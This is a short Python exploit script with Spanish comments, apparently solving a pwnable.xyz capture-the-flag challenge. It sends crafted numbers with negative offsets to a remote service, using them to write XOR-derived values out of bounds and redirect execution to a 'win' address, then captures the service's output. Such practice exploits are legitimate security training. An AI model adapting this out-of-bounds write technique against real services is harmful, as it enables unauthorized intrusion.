#!/usr/bin/env python3
import socket
import time
import sys

host = "svc.pwnable.xyz"
port = 30029

print("Conectando...")
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(30)

try:
    s.connect((host, port))
except:
    print("No puedo conectar, esperando...")
    time.sleep(15)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(30)
    s.connect((host, port))

banner = s.recv(1024)
print(banner.decode())

win = 0xa21

# Sabemos que crashea después de offset -6
# Vamos a sobrescribir -9, -8, -7 primero
print("Sobrescribiendo offsets -9, -8, -7...")
for offset in [-9, -8, -7]:
    b = abs(offset) * 0x11111
    a = win ^ b
    s.sendall(f"{a} {b} {offset}\n".encode())
    time.sleep(0.2)
    try:
        s.recv(1024, socket.MSG_DONTWAIT)
    except:
        pass

print("OK. Ahora offset -6 que causa crash...")

b = 6 * 0x11111
a = win ^ b

# Preparar para recibir TODO antes de enviar
import threading

received_data = []

def receiver():
    try:
        while True:
            data = s.recv(4096)
            if not data:
                break
            received_data.append(data)
            sys.stdout.write(data.decode())
            sys.stdout.flush()
    except:
        pass

# Iniciar thread de recepción
thread = threading.Thread(target=receiver, daemon=True)
thread.start()

# Enviar el payload que causa crash
print(f"Enviando offset -6...")
try:
    s.sendall(f"{a} {b} -6\n".encode())
except:
    print("(error al enviar)")

# Esperar a recibir datos
time.sleep(5)

print(f"\n{'='*60}")
print(f"Datos recibidos: {len(received_data)} chunks")
if received_data:
    full_data = b"".join(received_data)
    print(full_data.decode())
print('='*60)

s.close()